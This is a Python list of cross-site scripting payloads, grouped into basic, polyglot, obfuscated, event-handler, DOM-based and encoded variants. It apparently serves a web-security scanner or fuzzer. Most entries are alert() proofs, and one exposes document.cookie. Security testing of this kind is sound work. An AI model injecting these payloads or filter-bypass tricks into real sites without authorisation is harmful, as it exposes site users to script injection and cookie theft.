xss_payloads = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<b onmouseover=alert('XSS')>Hover me!</b>",
    "';alert('XSS');//",
    "<script>document.write(document.cookie)</script>",
    "javascript:alert('XSS')",
    "'\"><script>alert(1)</script>",
    "<iframe src='javascript:alert(`XSS`)'></iframe>",
    
    # Polyglot Payloads
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1))//%0D%0A%0d%0a//</style></title></textarea></noscript>",
    "<button onclick=alert(1)>Click Me</button>",
    "<svg><script>alert(1)</script></svg>",
    
    # Advanced Obfuscation
    "<sCriPt>alert('XSS')</sCriPt>",
    "<a href=javascript:alert('XSS')>Click Here</a>",
    "<input type='text' onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>Hover me!</details>",
    "<video src=x onerror=alert('XSS')></video>",
    "<object data='javascript:alert(`XSS`)'></object>",
    "<embed src='javascript:alert(`XSS`)'>",
    
    # Event Handler Injection
    "<body onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<a href='https://example.com' target='_self' onclick='alert(\"XSS\")'>Click me</a>",
    "<form action='#' onsubmit=alert('XSS')><input type='submit'></form>",
    
    # DOM-based XSS Triggers
    "https://example.com/path?param=<script>alert('XSS')</script>",
    "https://example.com/#<script>alert('XSS')</script>",
    
    # Obfuscated Attributes
    "<svg><style>{-o-link-source:expression(alert(1))}</style></svg>",
    "<img src=`javascript:alert(\"XSS\")`>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    
    # Unicode and Encoding Tricks
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",  # URL-encoded
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"  # HTML-encoded
]
